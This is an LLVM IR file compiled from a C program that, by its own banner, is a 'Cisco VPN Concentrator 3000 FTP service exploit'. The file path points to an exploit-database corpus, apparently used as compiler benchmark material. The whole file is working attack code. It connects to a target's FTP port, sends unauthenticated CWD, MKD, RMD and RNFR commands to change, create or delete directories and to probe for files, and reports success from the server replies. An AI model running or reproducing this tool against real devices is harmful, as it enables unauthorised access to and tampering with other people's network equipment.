; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_2638.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_2638.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i8, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32*, i32 }
%struct.sockaddr = type { i32 }

@main.options = internal global [7 x %struct.option] [%struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i32 1, i8 0, i32 115 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i32 1, i8 0, i32 112 }, %struct.option { i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0), i32 1, i8 0, i32 114 }, %struct.option { i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i32 1, i8 0, i32 109 }, %struct.option { i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i32 1, i8 0, i32 99 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i32 1, i8 0, i32 116 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i32 0, i8 0, i32 104 }], align 16
@.str = private unnamed_addr constant [7 x i8] c"server\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"port\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"rmdir\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"mkdir\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"chdir\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"test\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.7 = private unnamed_addr constant [51 x i8] c"[ Cisco VPN Concentrator 3000 FTP service exploit\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"s:p:r:m:c:t:h\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [27 x i8] c"[ Error unknown host '%s'\0A\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.11 = private unnamed_addr constant [69 x i8] c"[ Error: cannot delete directory as another option already selected\0A\00", align 1
@.str.12 = private unnamed_addr constant [63 x i8] c"[ Error: cannot change dir as another option already selected\0A\00", align 1
@.str.13 = private unnamed_addr constant [71 x i8] c"[ Error: cannot test for existance as another option already selected\0A\00", align 1
@.str.14 = private unnamed_addr constant [67 x i8] c"[ Error: cannot make directory as another option already selected\0A\00", align 1
@.str.15 = private unnamed_addr constant [25 x i8] c"[ Usage instructions.\0A[\0A\00", align 1
@.str.16 = private unnamed_addr constant [30 x i8] c"[ %s <required> (optional)\0A[\0A\00", align 1
@.str.17 = private unnamed_addr constant [111 x i8] c"[\09--server|-s <ip/hostname>\0A[\09--port|-p (port) [default 21]\0A[\09--rmdir|-r (directory)\0A[\09--mkdir|-m (directory)\0A\00", align 1
@.str.18 = private unnamed_addr constant [61 x i8] c"[\09--chdir|-c (directory)\0A[\09--test|-t (filename/directory)\0A[\0A\00", align 1
@.str.19 = private unnamed_addr constant [58 x i8] c"[ Error insufficient arguements, try running '%s --help'\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.20 = private unnamed_addr constant [22 x i8] c"[ Cannot open socket\0A\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"[ Cannot connect\0A\00", align 1
@.str.22 = private unnamed_addr constant [28 x i8] c"[ Connected to %s (%d/tcp)\0A\00", align 1
@.str.23 = private unnamed_addr constant [28 x i8] c"[ Changing directory to %s\0A\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [17 x i8] c"250 Changed to .\00", align 1
@.str.26 = private unnamed_addr constant [36 x i8] c"[ Success! changed directory to %s\0A\00", align 1
@.str.27 = private unnamed_addr constant [30 x i8] c"530 Can't change directory to\00", align 1
@.str.28 = private unnamed_addr constant [45 x i8] c"[ Error! cannot set current directory to %s\0A\00", align 1
@.str.29 = private unnamed_addr constant [23 x i8] c"[ Making directory %s\0A\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [28 x i8] c"257 MKD command successful.\00", align 1
@.str.32 = private unnamed_addr constant [33 x i8] c"[ Success! directory %s created\0A\00", align 1
@.str.33 = private unnamed_addr constant [25 x i8] c"[ Deleting directory %s\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"RMD %s\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [28 x i8] c"250 RMD command successful.\00", align 1
@.str.36 = private unnamed_addr constant [33 x i8] c"[ Success! directory %s deleted\0A\00", align 1
@.str.37 = private unnamed_addr constant [35 x i8] c"[ Testing for the existance of %s\0A\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"RNFR %s\0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [56 x i8] c"350 RNFR accepted - file exists, ready for destination.\00", align 1
@.str.40 = private unnamed_addr constant [27 x i8] c"[ Success! %s does exist!\0A\00", align 1
@.str.41 = private unnamed_addr constant [25 x i8] c"550 File does not exist!\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"[ Success! %s does not exist\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %struct.sockaddr_in, align 4
  %24 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  store i32 21, i32* %13, align 4
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.7, i64 0, i64 0))
  br label %26

26:                                               ; preds = %120, %2
  %27 = load i32, i32* %14, align 4
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %29, label %121

29:                                               ; preds = %26
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call i32 @getopt_long(i32 %30, i8** %31, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), %struct.option* getelementptr inbounds ([7 x %struct.option], [7 x %struct.option]* @main.options, i64 0, i64 0), i32* %7)
  store i32 %32, i32* %14, align 4
  %33 = load i32, i32* %14, align 4
  switch i32 %33, label %119 [
    i32 115, label %34
    i32 112, label %55
    i32 114, label %58
    i32 99, label %71
    i32 116, label %84
    i32 109, label %97
    i32 104, label %110
  ]

34:                                               ; preds = %29
  %35 = load i32, i32* %6, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %54

37:                                               ; preds = %34
  %38 = load i8*, i8** @optarg, align 8
  %39 = call %struct.hostent* @gethostbyname(i8* %38)
  store %struct.hostent* %39, %struct.hostent** %24, align 8
  %40 = load %struct.hostent*, %struct.hostent** %24, align 8
  %41 = icmp eq %struct.hostent* %40, null
  br i1 %41, label %42, label %46

42:                                               ; preds = %37
  %43 = load i8*, i8** @optarg, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0), i8* %43)
  %45 = call i32 @exit(i32 1) #3
  unreachable

46:                                               ; preds = %37
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = add nsw i32 %48, 1
  %50 = call i8* @malloc(i32 %49)
  store i8* %50, i8** %18, align 8
  %51 = load i8*, i8** %18, align 8
  %52 = load i8*, i8** @optarg, align 8
  %53 = call i32 @sprintf(i8* %51, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %52)
  store i32 1, i32* %6, align 4
  br label %54

54:                                               ; preds = %46, %34
  br label %120

55:                                               ; preds = %29
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @atoi(i8* %56)
  store i32 %57, i32* %13, align 4
  br label %120

58:                                               ; preds = %29
  %59 = load i32, i32* %10, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %70

61:                                               ; preds = %58
  %62 = load i32, i32* %12, align 4
  %63 = icmp ne i32 %62, 1
  br i1 %63, label %64, label %66

64:                                               ; preds = %61
  store i32 1, i32* %12, align 4
  store i32 1, i32* %10, align 4
  %65 = load i8*, i8** @optarg, align 8
  store i8* %65, i8** %19, align 8
  br label %69

66:                                               ; preds = %61
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.11, i64 0, i64 0))
  %68 = call i32 @exit(i32 1) #3
  unreachable

69:                                               ; preds = %64
  br label %70

70:                                               ; preds = %69, %58
  br label %120

71:                                               ; preds = %29
  %72 = load i32, i32* %9, align 4
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %83

74:                                               ; preds = %71
  %75 = load i32, i32* %12, align 4
  %76 = icmp ne i32 %75, 1
  br i1 %76, label %77, label %79

77:                                               ; preds = %74
  store i32 1, i32* %12, align 4
  store i32 1, i32* %9, align 4
  %78 = load i8*, i8** @optarg, align 8
  store i8* %78, i8** %19, align 8
  br label %82

79:                                               ; preds = %74
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.12, i64 0, i64 0))
  %81 = call i32 @exit(i32 2) #3
  unreachable

82:                                               ; preds = %77
  br label %83

83:                                               ; preds = %82, %71
  br label %120

84:                                               ; preds = %29
  %85 = load i32, i32* %11, align 4
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %87, label %96

87:                                               ; preds = %84
  %88 = load i32, i32* %12, align 4
  %89 = icmp ne i32 %88, 1
  br i1 %89, label %90, label %92

90:                                               ; preds = %87
  store i32 1, i32* %12, align 4
  store i32 1, i32* %11, align 4
  %91 = load i8*, i8** @optarg, align 8
  store i8* %91, i8** %20, align 8
  br label %95

92:                                               ; preds = %87
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.13, i64 0, i64 0))
  %94 = call i32 @exit(i32 3) #3
  unreachable

95:                                               ; preds = %90
  br label %96

96:                                               ; preds = %95, %84
  br label %120

97:                                               ; preds = %29
  %98 = load i32, i32* %8, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %109

100:                                              ; preds = %97
  %101 = load i32, i32* %12, align 4
  %102 = icmp ne i32 %101, 1
  br i1 %102, label %103, label %105

103:                                              ; preds = %100
  store i32 1, i32* %12, align 4
  store i32 1, i32* %8, align 4
  %104 = load i8*, i8** @optarg, align 8
  store i8* %104, i8** %19, align 8
  br label %108

105:                                              ; preds = %100
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.14, i64 0, i64 0))
  %107 = call i32 @exit(i32 4) #3
  unreachable

108:                                              ; preds = %103
  br label %109

109:                                              ; preds = %108, %97
  br label %120

110:                                              ; preds = %29
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.15, i64 0, i64 0))
  %112 = load i8**, i8*** %5, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 0
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.16, i64 0, i64 0), i8* %114)
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.17, i64 0, i64 0))
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.18, i64 0, i64 0))
  %118 = call i32 @exit(i32 0) #3
  unreachable

119:                                              ; preds = %29
  br label %120

120:                                              ; preds = %119, %109, %96, %83, %70, %55, %54
  br label %26

121:                                              ; preds = %26
  %122 = load i32, i32* %6, align 4
  %123 = icmp ne i32 %122, 1
  br i1 %123, label %127, label %124

124:                                              ; preds = %121
  %125 = load i32, i32* %12, align 4
  %126 = icmp ne i32 %125, 1
  br i1 %126, label %127, label %133

127:                                              ; preds = %124, %121
  %128 = load i8**, i8*** %5, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 0
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.19, i64 0, i64 0), i8* %130)
  %132 = call i32 @exit(i32 1) #3
  unreachable

133:                                              ; preds = %124
  %134 = load %struct.hostent*, %struct.hostent** %24, align 8
  %135 = getelementptr inbounds %struct.hostent, %struct.hostent* %134, i32 0, i32 2
  %136 = load i32, i32* %135, align 8
  %137 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 2
  store i32 %136, i32* %137, align 4
  %138 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 1
  %139 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %138, i32 0, i32 0
  %140 = bitcast i32* %139 to i8*
  %141 = load %struct.hostent*, %struct.hostent** %24, align 8
  %142 = getelementptr inbounds %struct.hostent, %struct.hostent* %141, i32 0, i32 1
  %143 = load i32*, i32** %142, align 8
  %144 = getelementptr inbounds i32, i32* %143, i64 0
  %145 = load i32, i32* %144, align 4
  %146 = load %struct.hostent*, %struct.hostent** %24, align 8
  %147 = getelementptr inbounds %struct.hostent, %struct.hostent* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = call i32 @memcpy(i8* %140, i32 %145, i32 %148)
  %150 = load i32, i32* %13, align 4
  %151 = call i32 @htons(i32 %150)
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %23, i32 0, i32 0
  store i32 %151, i32* %152, align 4
  %153 = load i32, i32* @AF_INET, align 4
  %154 = load i32, i32* @SOCK_STREAM, align 4
  %155 = call i32 @socket(i32 %153, i32 %154, i32 0)
  store i32 %155, i32* %15, align 4
  %156 = load i32, i32* %15, align 4
  %157 = icmp slt i32 %156, 0
  br i1 %157, label %158, label %161

158:                                              ; preds = %133
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.20, i64 0, i64 0))
  %160 = call i32 @exit(i32 1) #3
  unreachable

161:                                              ; preds = %133
  %162 = load i32, i32* %15, align 4
  %163 = bitcast %struct.sockaddr_in* %23 to %struct.sockaddr*
  %164 = call i32 @connect(i32 %162, %struct.sockaddr* %163, i32 12)
  store i32 %164, i32* %16, align 4
  %165 = load i32, i32* %16, align 4
  %166 = icmp slt i32 %165, 0
  br i1 %166, label %167, label %170

167:                                              ; preds = %161
  %168 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i64 0, i64 0))
  %169 = call i32 @exit(i32 1) #3
  unreachable

170:                                              ; preds = %161
  %171 = load i8*, i8** %18, align 8
  %172 = load i32, i32* %13, align 4
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.22, i64 0, i64 0), i8* %171, i32 %172)
  %174 = call i8* @malloc(i32 1024)
  store i8* %174, i8** %22, align 8
  %175 = load i32, i32* %9, align 4
  %176 = icmp eq i32 %175, 1
  br i1 %176, label %177, label %219

177:                                              ; preds = %170
  %178 = load i8*, i8** %19, align 8
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.23, i64 0, i64 0), i8* %178)
  %180 = load i8*, i8** %19, align 8
  %181 = call i32 @strlen(i8* %180)
  %182 = add nsw i32 2048, %181
  store i32 %182, i32* %17, align 4
  %183 = load i32, i32* %17, align 4
  %184 = call i8* @malloc(i32 %183)
  store i8* %184, i8** %21, align 8
  %185 = load i8*, i8** %21, align 8
  %186 = load i8*, i8** %19, align 8
  %187 = call i32 @sprintf(i8* %185, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i64 0, i64 0), i8* %186)
  %188 = load i32, i32* %15, align 4
  %189 = load i8*, i8** %21, align 8
  %190 = load i8*, i8** %21, align 8
  %191 = call i32 @strlen(i8* %190)
  %192 = call i32 @send(i32 %188, i8* %189, i32 %191, i32 0)
  store i32 %192, i32* %16, align 4
  br label %193

193:                                              ; preds = %217, %177
  %194 = load i32, i32* %15, align 4
  %195 = load i8*, i8** %22, align 8
  %196 = call i32 @recv(i32 %194, i8* %195, i32 1023, i32 0)
  store i32 %196, i32* %16, align 4
  %197 = icmp ne i32 %196, -1
  br i1 %197, label %198, label %218

198:                                              ; preds = %193
  %199 = load i8*, i8** %22, align 8
  %200 = load i32, i32* %16, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8, i8* %199, i64 %201
  store i8 0, i8* %202, align 1
  %203 = load i8*, i8** %22, align 8
  %204 = call i32* @strstr(i8* %203, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.25, i64 0, i64 0))
  %205 = icmp ne i32* %204, null
  br i1 %205, label %206, label %209

206:                                              ; preds = %198
  %207 = load i8*, i8** %19, align 8
  %208 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.26, i64 0, i64 0), i8* %207)
  br label %218

209:                                              ; preds = %198
  %210 = load i8*, i8** %22, align 8
  %211 = call i32* @strstr(i8* %210, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.27, i64 0, i64 0))
  %212 = icmp ne i32* %211, null
  br i1 %212, label %213, label %217

213:                                              ; preds = %209
  %214 = load i8*, i8** %19, align 8
  %215 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.28, i64 0, i64 0), i8* %214)
  %216 = call i32 @exit(i32 -1) #3
  unreachable

217:                                              ; preds = %209
  br label %193

218:                                              ; preds = %206, %193
  br label %219

219:                                              ; preds = %218, %170
  %220 = load i32, i32* %8, align 4
  %221 = icmp eq i32 %220, 1
  br i1 %221, label %222, label %256

222:                                              ; preds = %219
  %223 = load i8*, i8** %19, align 8
  %224 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.29, i64 0, i64 0), i8* %223)
  %225 = load i8*, i8** %19, align 8
  %226 = call i32 @strlen(i8* %225)
  %227 = add nsw i32 2048, %226
  store i32 %227, i32* %17, align 4
  %228 = load i32, i32* %17, align 4
  %229 = call i8* @malloc(i32 %228)
  store i8* %229, i8** %21, align 8
  %230 = load i8*, i8** %21, align 8
  %231 = load i8*, i8** %19, align 8
  %232 = call i32 @sprintf(i8* %230, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i64 0, i64 0), i8* %231)
  %233 = load i32, i32* %15, align 4
  %234 = load i8*, i8** %21, align 8
  %235 = load i8*, i8** %21, align 8
  %236 = call i32 @strlen(i8* %235)
  %237 = call i32 @send(i32 %233, i8* %234, i32 %236, i32 0)
  store i32 %237, i32* %16, align 4
  br label %238

238:                                              ; preds = %254, %222
  %239 = load i32, i32* %15, align 4
  %240 = load i8*, i8** %22, align 8
  %241 = call i32 @recv(i32 %239, i8* %240, i32 1023, i32 0)
  store i32 %241, i32* %16, align 4
  %242 = icmp ne i32 %241, -1
  br i1 %242, label %243, label %255

243:                                              ; preds = %238
  %244 = load i8*, i8** %22, align 8
  %245 = load i32, i32* %16, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds i8, i8* %244, i64 %246
  store i8 0, i8* %247, align 1
  %248 = load i8*, i8** %22, align 8
  %249 = call i32* @strstr(i8* %248, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.31, i64 0, i64 0))
  %250 = icmp ne i32* %249, null
  br i1 %250, label %251, label %254

251:                                              ; preds = %243
  %252 = load i8*, i8** %19, align 8
  %253 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.32, i64 0, i64 0), i8* %252)
  br label %255

254:                                              ; preds = %243
  br label %238

255:                                              ; preds = %251, %238
  br label %256

256:                                              ; preds = %255, %219
  %257 = load i32, i32* %10, align 4
  %258 = icmp eq i32 %257, 1
  br i1 %258, label %259, label %293

259:                                              ; preds = %256
  %260 = load i8*, i8** %19, align 8
  %261 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.33, i64 0, i64 0), i8* %260)
  %262 = load i8*, i8** %19, align 8
  %263 = call i32 @strlen(i8* %262)
  %264 = add nsw i32 2048, %263
  store i32 %264, i32* %17, align 4
  %265 = load i32, i32* %17, align 4
  %266 = call i8* @malloc(i32 %265)
  store i8* %266, i8** %21, align 8
  %267 = load i8*, i8** %21, align 8
  %268 = load i8*, i8** %19, align 8
  %269 = call i32 @sprintf(i8* %267, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i64 0, i64 0), i8* %268)
  %270 = load i32, i32* %15, align 4
  %271 = load i8*, i8** %21, align 8
  %272 = load i8*, i8** %21, align 8
  %273 = call i32 @strlen(i8* %272)
  %274 = call i32 @send(i32 %270, i8* %271, i32 %273, i32 0)
  store i32 %274, i32* %16, align 4
  br label %275

275:                                              ; preds = %291, %259
  %276 = load i32, i32* %15, align 4
  %277 = load i8*, i8** %22, align 8
  %278 = call i32 @recv(i32 %276, i8* %277, i32 1023, i32 0)
  store i32 %278, i32* %16, align 4
  %279 = icmp ne i32 %278, -1
  br i1 %279, label %280, label %292

280:                                              ; preds = %275
  %281 = load i8*, i8** %22, align 8
  %282 = load i32, i32* %16, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds i8, i8* %281, i64 %283
  store i8 0, i8* %284, align 1
  %285 = load i8*, i8** %22, align 8
  %286 = call i32* @strstr(i8* %285, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.35, i64 0, i64 0))
  %287 = icmp ne i32* %286, null
  br i1 %287, label %288, label %291

288:                                              ; preds = %280
  %289 = load i8*, i8** %19, align 8
  %290 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i64 0, i64 0), i8* %289)
  br label %292

291:                                              ; preds = %280
  br label %275

292:                                              ; preds = %288, %275
  br label %293

293:                                              ; preds = %292, %256
  %294 = load i32, i32* %11, align 4
  %295 = icmp eq i32 %294, 1
  br i1 %295, label %296, label %337

296:                                              ; preds = %293
  %297 = load i8*, i8** %20, align 8
  %298 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.37, i64 0, i64 0), i8* %297)
  %299 = load i8*, i8** %20, align 8
  %300 = call i32 @strlen(i8* %299)
  %301 = add nsw i32 2048, %300
  store i32 %301, i32* %17, align 4
  %302 = load i32, i32* %17, align 4
  %303 = call i8* @malloc(i32 %302)
  store i8* %303, i8** %21, align 8
  %304 = load i8*, i8** %21, align 8
  %305 = load i8*, i8** %20, align 8
  %306 = call i32 @sprintf(i8* %304, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i64 0, i64 0), i8* %305)
  %307 = load i32, i32* %15, align 4
  %308 = load i8*, i8** %21, align 8
  %309 = load i8*, i8** %21, align 8
  %310 = call i32 @strlen(i8* %309)
  %311 = call i32 @send(i32 %307, i8* %308, i32 %310, i32 0)
  store i32 %311, i32* %16, align 4
  br label %312

312:                                              ; preds = %335, %296
  %313 = load i32, i32* %15, align 4
  %314 = load i8*, i8** %22, align 8
  %315 = call i32 @recv(i32 %313, i8* %314, i32 1023, i32 0)
  store i32 %315, i32* %16, align 4
  %316 = icmp ne i32 %315, -1
  br i1 %316, label %317, label %336

317:                                              ; preds = %312
  %318 = load i8*, i8** %22, align 8
  %319 = load i32, i32* %16, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds i8, i8* %318, i64 %320
  store i8 0, i8* %321, align 1
  %322 = load i8*, i8** %22, align 8
  %323 = call i32* @strstr(i8* %322, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.39, i64 0, i64 0))
  %324 = icmp ne i32* %323, null
  br i1 %324, label %325, label %328

325:                                              ; preds = %317
  %326 = load i8*, i8** %20, align 8
  %327 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.40, i64 0, i64 0), i8* %326)
  br label %336

328:                                              ; preds = %317
  %329 = load i8*, i8** %22, align 8
  %330 = call i32* @strstr(i8* %329, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.41, i64 0, i64 0))
  %331 = icmp ne i32* %330, null
  br i1 %331, label %332, label %335

332:                                              ; preds = %328
  %333 = load i8*, i8** %20, align 8
  %334 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i64 0, i64 0), i8* %333)
  br label %336

335:                                              ; preds = %328
  br label %312

336:                                              ; preds = %332, %325, %312
  br label %337

337:                                              ; preds = %336, %293
  %338 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32* @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
